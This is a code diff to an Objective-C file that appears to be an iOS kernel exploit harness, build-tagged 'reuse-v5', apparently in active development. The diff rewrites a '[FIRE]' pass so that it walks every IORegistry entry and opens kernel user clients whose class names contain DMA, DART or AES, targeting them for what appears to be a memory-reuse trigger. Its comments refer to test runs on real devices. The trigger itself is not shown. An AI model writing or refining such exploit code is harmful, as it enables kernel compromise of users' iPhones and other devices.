@@ -31,7 +31,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P101_BUILD @"p101-43684-reuse-v4"
+#define P101_BUILD @"p101-43684-reuse-v5"
 #define P101_TAG   @"p101"
 #define P101_LEN   0x4000ull
 
@@ -303,19 +303,21 @@ static int p101_is_fp(kern_return_t kr) {
         IOObjectRelease(it);
     }
 
-    /* v4 DYNAMIC pass: walk every service instance, sweep UCs whose class
-       name carries a DMA/DART/AES engine family substring. This covers the
-       per-SoC names the static table can't (e.g. AudioDMAController-T8150 on
-       the 17 Pro Max). Bounded: 8 instances max across both open types. */
+    /* v4 DYNAMIC pass: walk every registry entry on the IOService plane,
+       sweep UCs whose class name carries a DMA/DART/AES engine substring.
+       v4's IOServiceMatching("IOService") matched nothing (real run 19:37);
+       the plane iterator is the correct enumeration. 8 instances max. */
     if (!fired) {
         io_iterator_t it = 0;
-        kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault,
-                                                        IOServiceMatching("IOService"), &it);
+        kern_return_t kr = IORegistryEntryCreateIterator(kIOMainPortDefault, kIOServicePlane,
+            kIORegistryIterateRecursively, &it);
         if (kr == KERN_SUCCESS && it) {
             L(@"[FIRE] dynamic registry pass (class name contains DMA/DART/AES)");
-            io_service_t svc;
+            io_registry_entry_t svc;
             unsigned opened = 0;
-            while ((svc = IOIteratorNext(it)) && opened < 8) {
+            /* registry iterators are plain io_iterator_t — IOIteratorNext
+               walks them (IORegistryIteratorNextEntry is not in the iOS SDK). */
+            while ((svc = (io_registry_entry_t)IOIteratorNext(it)) && opened < 8) {
                 char cls[128] = {0};
                 io_name_t c2;
                 if (IOObjectGetClass(svc, c2) == KERN_SUCCESS) {
